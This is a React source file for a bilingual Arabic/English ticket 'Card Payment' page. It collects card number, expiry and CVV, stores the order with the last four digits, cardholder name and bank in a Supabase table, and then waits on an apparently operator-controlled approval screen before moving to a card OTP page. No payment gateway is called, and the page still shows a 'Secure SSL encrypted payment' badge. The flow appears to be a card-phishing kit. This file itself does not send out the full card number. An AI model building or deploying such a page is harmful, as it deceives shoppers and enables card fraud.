                {isAr ? "الانتهاء" : "Expires"}
              </p>
              <motion.p
                className={`text-xs font-medium font-mono ${expiryFocused ? "text-yellow-300" : "text-white"}`}
                key={displayExpiry}
                initial={{ opacity: 0.5 }}
                animate={expiryFocused ? {
                  opacity: [1, 0.4, 1],
                  textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"],
                } : { opacity: 1, textShadow: "none" }}
                transition={expiryFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.15 }}
              >
                {displayExpiry}
              </motion.p>
            </div>
            <div className="text-end">
              <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">CVV</p>
              <motion.p
                className={`text-sm font-bold font-mono tracking-[0.15em] rounded px-1.5 py-0.5 ${cvvFocused ? "text-yellow-300" : "text-white"}`}
                key={cvv || "empty"}
                initial={{ opacity: 0.5 }}
                animate={cvvFocused ? {
                  opacity: [1, 0.4, 1],
                  textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"],
                } : { opacity: 1, textShadow: "none" }}
                transition={cvvFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.3 }}
              >
                {cvv || "•••"}
              </motion.p>
            </div>
          </div>
        </div>

        {/* ─── Back Face ─── */}
        <div
          className="absolute inset-0 rounded-2xl overflow-hidden shadow-xl"
          style={{
            background: `linear-gradient(135deg, ${colors.from}, ${colors.to})`,
            backfaceVisibility: "hidden",
            transform: "rotateY(180deg)",
          }}
        >
          {/* Magnetic stripe */}
          <div className="absolute top-[15%] left-0 right-0 h-[14%] bg-black/70" />

          {/* Signature & CVV */}
          <div className="absolute top-[40%] left-[8%] right-[8%] flex items-center gap-3">
            <div className="flex-1 h-10 rounded bg-white/20 backdrop-blur-sm" />
            <div className="bg-white rounded px-4 py-2 min-w-[70px] text-center">
              <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">CVV</p>
              <p className="text-foreground font-mono font-bold text-lg tracking-[0.15em]">
                {cvv || "•••"}
              </p>
            </div>
          </div>

          {/* Brand logo on back */}
          <div className="absolute bottom-[10%] end-[8%]">
            {brand && (() => {
              const Logo = brandLogos[brand];
              return <Logo className="h-7 brightness-0 invert opacity-60" />;
            })()}
          </div>

          {/* Info text */}
          <p className="absolute bottom-[12%] start-[8%] text-white/40 text-[9px] max-w-[180px] leading-relaxed">
            {isAr
              ? "هذه البطاقة ملك للبنك المصدر. الاستخدام يخضع للشروط والأحكام."
              : "This card is property of the issuing bank. Use is subject to terms and conditions."}
          </p>
        </div>
      </motion.div>
    </div>
  );
};

/* ─── Main Component ─── */
const CardPayment = () => {
  const { lang } = useLanguage();
  const isAr = lang === "ar";
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();

  const state = location.state as {
    tickets?: { id: number; name: string; price: number; qty: number }[];
    email?: string;
    phone?: string;
    total?: number;
    vat?: number;
    subtotal?: number;
  } | null;

  const total = state?.total ?? 0;
  const subtotal = state?.subtotal ?? 0;
  const vat = state?.vat ?? 0;

  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const expiry = expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "";
  const detectedBrand = detectCardBrand(cardNumber);
  const detectedBankInfo = detectBankInfo(cardNumber);
  const detectedBank = detectedBankInfo ? (isAr ? detectedBankInfo.nameAr : detectedBankInfo.name) : null;
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [cvvFocused, setCvvFocused] = useState(false);
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [cardNameFocused, setCardNameFocused] = useState(false);
  const [expiryFocused, setExpiryFocused] = useState(false);
  const [manualFlip, setManualFlip] = useState(false);
  const isFlipped = cvvFocused || manualFlip;
  const [cardShake, setCardShake] = useState(false);
  const [cardNumberGlow, setCardNumberGlow] = useState(false);
  const [expiryGlow, setExpiryGlow] = useState(false);
  const [cvvGlow, setCvvGlow] = useState(false);
  const [expiryShake, setExpiryShake] = useState(false);
  const [cvvShake, setCvvShake] = useState(false);
  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const currentYear = new Date().getFullYear() % 100;
  const years = Array.from({ length: 12 }, (_, i) => String(currentYear + i).padStart(2, "0"));
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));

  const validate = () => {
    const e: Record<string, string> = {};
    if (!cardName.trim()) e.cardName = isAr ? "أدخل اسم حامل البطاقة" : "Enter cardholder name";
    const rawCardNumber = cardNumber.replace(/\s/g, "");
    if (rawCardNumber.length < 13) {
      e.cardNumber = isAr ? "أدخل رقم بطاقة صحيح" : "Enter a valid card number";
    } else if (!isValidLuhn(rawCardNumber)) {
      e.cardNumber = isAr ? "رقم البطاقة غير صحيح، يرجى التحقق" : "Invalid card number, please check";
    } else if (!detectedBrand) {
      e.cardNumber = isAr ? "نوع البطاقة غير مدعوم" : "Card type not supported";
    }
    if (!/^\d{2}\/\d{2}$/.test(expiry)) e.expiry = isAr ? "أدخل تاريخ انتهاء صحيح" : "Enter a valid expiry date";
    if (cvv.length < 3) e.cvv = isAr ? "أدخل رمز CVV صحيح" : "Enter a valid CVV";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const [waitingOrderId, setWaitingOrderId] = useState<string | null>(null);
  const [cardLast4Saved, setCardLast4Saved] = useState("");
  const [cardBrandSaved, setCardBrandSaved] = useState("");

  const handlePay = async () => {
    if (!validate()) {
      setCardShake(true);
      setTimeout(() => setCardShake(false), 600);
      if (errors.cardNumber) {
        setCardNumberGlow(true);
        setTimeout(() => setCardNumberGlow(false), 2000);
      }
      if (errors.expiry) {
        setExpiryGlow(true);
        setExpiryShake(true);
        setTimeout(() => setExpiryGlow(false), 2000);
        setTimeout(() => setExpiryShake(false), 600);
      }
      if (errors.cvv) {
        setCvvGlow(true);
        setCvvShake(true);
        setTimeout(() => setCvvGlow(false), 2000);
        setTimeout(() => setCvvShake(false), 600);
      }
      playChime("error");
      if (navigator.vibrate) {
        navigator.vibrate([50, 30, 50]);
      }
      toast({
        title: isAr ? "⚠️ يرجى تعبئة بيانات البطاقة" : "⚠️ Please fill card details",
        description: isAr ? "تحقق من البيانات وحاول مرة أخرى" : "Check the details and try again",
        variant: "destructive",
      });
      return;
    }
    const digits = cardNumber.replace(/\s/g, "");
    const cardBrand = detectedBrand || "visa";
    const last4 = digits.slice(-4);
    setCardLast4Saved(last4);
    setCardBrandSaved(cardBrand);

    const confirmationNumber = `DIR-${Date.now().toString(36).toUpperCase().slice(-6)}`;

    const { data: inserted } = await supabase.from("ticket_orders").insert({
      email: state?.email || "",
      phone: state?.phone || "",
      tickets: state?.tickets || [],
      subtotal: state?.subtotal || 0,
      vat: state?.vat || 0,
      total: state?.total || 0,
      payment_method: "card",
      status: "pending",
      confirmation_number: confirmationNumber,
      card_last4: last4,
      card_brand: cardBrand,
      cardholder_name: cardName.trim() || null,
      bank_name: detectedBank || null,
    } as any).select("id").single();

    if (inserted?.id) {
      trackVisitorAction("card_payment_submitted", `دفع بالبطاقة — ${total} ر.س`, undefined, { email: state?.email });
      setWaitingOrderId(inserted.id);
    }
  };

  const handleCardApproved = () => {
    navigate("/card-otp", {
      state: {
        tickets: state?.tickets,
        email: state?.email,
        phone: state?.phone,
        total,
        vat,
        subtotal,
        cardLast4: cardLast4Saved,
        cardBrand: cardBrandSaved,
        orderId: waitingOrderId,
      },
    });
  };

  const handleCardRejected = () => {
    setWaitingOrderId(null);
    toast({
      title: isAr ? "❌ تم رفض الطلب" : "❌ Request rejected",
      description: isAr ? "يرجى المحاولة مرة أخرى" : "Please try again",
      variant: "destructive",
    });
  };

  const BackArrow = isAr ? ArrowRight : ArrowLeft;

  // Guard: no state = show fallback
  if (!state || !state.total) {
    return (
      <div className="min-h-screen bg-background font-body flex flex-col items-center justify-center gap-4 p-6 text-center">
        <p className="text-muted-foreground text-lg">{isAr ? "لا توجد بيانات طلب. يرجى البدء من صفحة التذاكر." : "No order data found. Please start from the tickets page."}</p>
        <button onClick={() => navigate("/tickets")} className="px-6 py-2 bg-primary text-primary-foreground rounded-lg font-medium">{isAr ? "العودة للتذاكر" : "Go to Tickets"}</button>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background dark:bg-[radial-gradient(ellipse_at_top,hsl(25_20%_14%),hsl(25_20%_8%))] font-body" dir={isAr ? "rtl" : "ltr"}>
      <Header />

      <main className="pt-28 pb-20 px-4">
        <div className="max-w-lg mx-auto">
          {waitingOrderId ? (
            <div className="bg-card rounded-2xl border border-border p-6 md:p-8 shadow-sm">
              <WaitingApproval
                orderId={waitingOrderId}
                step="card"
                onApproved={handleCardApproved}
                onRejected={handleCardRejected}
              />
            </div>
          ) : (
          <>
          {/* Back button */}
          <button
            onClick={() => navigate(-1)}
            className="flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground transition-colors mb-6"
          >
            <BackArrow className="w-4 h-4" />
            <span>{isAr ? "رجوع" : "Back"}</span>
          </button>

          {/* Card */}
          <div className="bg-card rounded-2xl border border-border dark:border-[hsl(var(--gold)/0.2)] p-6 md:p-8 shadow-sm dark:shadow-[0_0_40px_-10px_hsl(var(--gold)/0.15)]">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-xl bg-primary/10 dark:bg-primary/15 flex items-center justify-center dark:shadow-[0_0_15px_-3px_hsl(var(--gold)/0.3)]">
                <CreditCard className="w-5 h-5 text-primary" />
              </div>
              <div>
                <h1 className="font-display text-xl font-bold text-foreground">
                  {isAr ? "الدفع بالبطاقة" : "Card Payment"}
                </h1>
                <p className="text-xs text-muted-foreground">
                  {isAr ? "أدخل بيانات بطاقتك لإتمام الدفع" : "Enter your card details to complete payment"}
                </p>
              </div>
            </div>

            {/* Amount summary */}
            <div className="bg-primary/5 dark:bg-primary/10 border border-primary/20 dark:border-primary/25 rounded-xl p-4 mb-6">
              <div className="flex justify-between text-sm text-muted-foreground mb-1">
                <span>{isAr ? "المجموع الفرعي" : "Subtotal"}</span>
                <span>{subtotal} {isAr ? "ر.س" : "SAR"}</span>
              </div>
              <div className="flex justify-between text-sm text-muted-foreground mb-2">
                <span>{isAr ? "ضريبة القيمة المضافة" : "VAT"}</span>
                <span>{vat} {isAr ? "ر.س" : "SAR"}</span>
              </div>
              <Separator className="my-2 dark:bg-primary/20" />
              <div className="flex justify-between font-bold text-foreground text-lg">
                <span>{isAr ? "الإجمالي" : "Total"}</span>
                <span className="dark:text-primary">{total} {isAr ? "ر.س" : "SAR"}</span>
              </div>
            </div>


            {/* Card form */}
            <div className="space-y-4">
              <div>
                <Label className="text-foreground text-sm">{isAr ? "اسم حامل البطاقة" : "Cardholder Name"}</Label>
                <Input
                  className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border dark:focus:border-primary/50 dark:focus:ring-primary/20 ${errors.cardName ? "border-destructive" : ""}`}
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value)}
                  onFocus={() => { setCardNameFocused(true); setManualFlip(false); playChime("soft"); }}
                  onBlur={() => setCardNameFocused(false)}
                  placeholder={isAr ? "الاسم كما يظهر على البطاقة" : "Name as shown on card"}
                  maxLength={50}
                />
                {errors.cardName && <p className="text-destructive text-xs mt-1">{errors.cardName}</p>}
              </div>

              <div>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Label className="text-foreground text-sm">{isAr ? "رقم البطاقة" : "Card Number"}</Label>
                  </div>
                  <CardBrandLogos brand={detectedBrand} />
                </div>
                <Input
                  className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border dark:focus:border-primary/50 dark:focus:ring-primary/20 transition-all duration-300 ${errors.cardNumber ? "border-destructive" : ""} ${cardNumberGlow ? "ring-2 ring-destructive/50 shadow-[0_0_15px_hsl(var(--destructive)/0.4)] border-destructive" : ""}`}
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  onFocus={() => { setCardNumberFocused(true); setManualFlip(false); playChime("soft"); }}
                  onBlur={() => setCardNumberFocused(false)}
                  placeholder="0000 0000 0000 0000"
                  dir="ltr"
                  maxLength={19}
                />
                {errors.cardNumber && <p className="text-destructive text-xs mt-1">{errors.cardNumber}</p>}

                {/* Bank Info Strip */}
                <AnimatePresence>
                  {detectedBankInfo && (
                    <motion.div
                      initial={{ opacity: 0, height: 0, marginTop: 0 }}
                      animate={{ opacity: 1, height: "auto", marginTop: 8 }}
                      exit={{ opacity: 0, height: 0, marginTop: 0 }}
                      className="overflow-hidden"
                    >
                      <div className="flex items-center gap-2.5 bg-muted/50 dark:bg-muted/30 rounded-xl px-3 py-2.5 border border-border/50">
                        <div
                          className="w-8 h-8 rounded-lg flex items-center justify-center text-[9px] font-bold text-white shadow-sm shrink-0"
                          style={{ backgroundColor: detectedBankInfo.color }}
                        >
                          {detectedBankInfo.logo.slice(0, 3)}
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-[13px] font-semibold text-foreground truncate">{detectedBank}</p>
                          <p className="text-[11px] text-muted-foreground">
                            {isAr ? detectedBankInfo.typeAr : detectedBankInfo.type}
                            {detectedBrand && ` • ${detectedBrand.toUpperCase()}`}
                          </p>
                        </div>
                        {detectedBrand && (
                          <div className="shrink-0">
                            {(() => { const Logo = brandLogos[detectedBrand]; return Logo ? <Logo className="h-6" /> : null; })()}
                          </div>
                        )}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              <div className="grid grid-cols-3 gap-3">
                <motion.div animate={expiryShake ? { x: [0, -8, 8, -6, 6, -3, 3, 0] } : { x: 0 }} transition={{ duration: 0.5, ease: "easeInOut" }}>
                  <Label className="text-foreground text-sm">{isAr ? "الشهر" : "Month"}</Label>
                  <Select value={expiryMonth} onValueChange={setExpiryMonth} onOpenChange={(open) => { setExpiryFocused(open); if (open) { setManualFlip(false); playChime("soft"); } }}>
                    <SelectTrigger className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border transition-all duration-300 ${errors.expiry ? "border-destructive" : ""} ${expiryGlow ? "ring-2 ring-destructive/50 shadow-[0_0_15px_hsl(var(--destructive)/0.4)] border-destructive" : ""}`} dir="ltr">
                      <SelectValue placeholder="MM" />
                    </SelectTrigger>
                    <SelectContent>
                      {months.map((m) => (
                        <SelectItem key={m} value={m}>{m}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </motion.div>
                <motion.div animate={expiryShake ? { x: [0, -8, 8, -6, 6, -3, 3, 0] } : { x: 0 }} transition={{ duration: 0.5, ease: "easeInOut" }}>
                  <Label className="text-foreground text-sm">{isAr ? "السنة" : "Year"}</Label>
                  <Select value={expiryYear} onValueChange={setExpiryYear} onOpenChange={(open) => { setExpiryFocused(open); if (open) { setManualFlip(false); playChime("soft"); } }}>
                    <SelectTrigger className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border transition-all duration-300 ${errors.expiry ? "border-destructive" : ""} ${expiryGlow ? "ring-2 ring-destructive/50 shadow-[0_0_15px_hsl(var(--destructive)/0.4)] border-destructive" : ""}`} dir="ltr">
                      <SelectValue placeholder="YY" />
                    </SelectTrigger>
                    <SelectContent>
                      {years.map((y) => (
                        <SelectItem key={y} value={y}>{y}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {errors.expiry && <p className="text-destructive text-xs mt-1">{errors.expiry}</p>}
                </motion.div>
                <motion.div animate={cvvShake ? { x: [0, -8, 8, -6, 6, -3, 3, 0] } : { x: 0 }} transition={{ duration: 0.5, ease: "easeInOut" }}>
                  <Label className="text-foreground text-sm">CVV</Label>
                  <Input
                    className={`mt-1.5 bg-background dark:bg-muted/50 dark:border-border dark:focus:border-primary/50 dark:focus:ring-primary/20 transition-all duration-300 ${errors.cvv ? "border-destructive" : ""} ${cvvGlow ? "ring-2 ring-destructive/50 shadow-[0_0_15px_hsl(var(--destructive)/0.4)] border-destructive" : ""}`}
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    onFocus={() => { setCvvFocused(true); setManualFlip(false); playChime("click"); }}
                    onBlur={() => setCvvFocused(false)}
                    placeholder="123"
                    dir="ltr"
                    maxLength={4}
                    type="password"
                  />
                  {errors.cvv && <p className="text-destructive text-xs mt-1">{errors.cvv}</p>}
                </motion.div>
              </div>
            </div>

            {/* Interactive Card Preview */}
            <motion.div
              className="dark:drop-shadow-[0_8px_25px_hsl(var(--gold)/0.2)] mt-6"
              animate={cardShake ? { x: [0, -12, 12, -8, 8, -4, 4, 0] } : { x: 0 }}
              transition={{ duration: 0.5, ease: "easeInOut" }}
            >
              <CardPreview
                cardNumber={cardNumber}
                cardName={cardName}
                expiry={expiry}
                cvv={cvv}
                brand={detectedBrand}
                bankInfo={detectedBankInfo}
                bankName={detectedBank}
                isAr={isAr}
                isFlipped={isFlipped}
                cvvFocused={cvvFocused}
                cardNumberFocused={cardNumberFocused}
                cardNameFocused={cardNameFocused}
                expiryFocused={expiryFocused}
                onFlipToggle={() => setManualFlip(f => !f)}
              />
            </motion.div>

            <Button onClick={handlePay} className="w-full mt-2 h-12 text-base font-semibold bg-primary text-primary-foreground hover:bg-primary/90 dark:shadow-[0_0_20px_-5px_hsl(var(--gold)/0.4)] dark:hover:shadow-[0_0_25px_-3px_hsl(var(--gold)/0.5)] transition-shadow">
              <Lock className="w-4 h-4 me-2" />
              {isAr ? `ادفع ${total} ر.س` : `Pay ${total} SAR`}
            </Button>

            <div className="flex items-center justify-center gap-1.5 mt-4 text-xs text-muted-foreground">
              <ShieldCheck className="w-3.5 h-3.5 dark:text-primary/60" />
              <span>{isAr ? "دفع آمن ومشفر بتقنية SSL" : "Secure SSL encrypted payment"}</span>
            </div>
          </div>
          </>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default CardPayment;
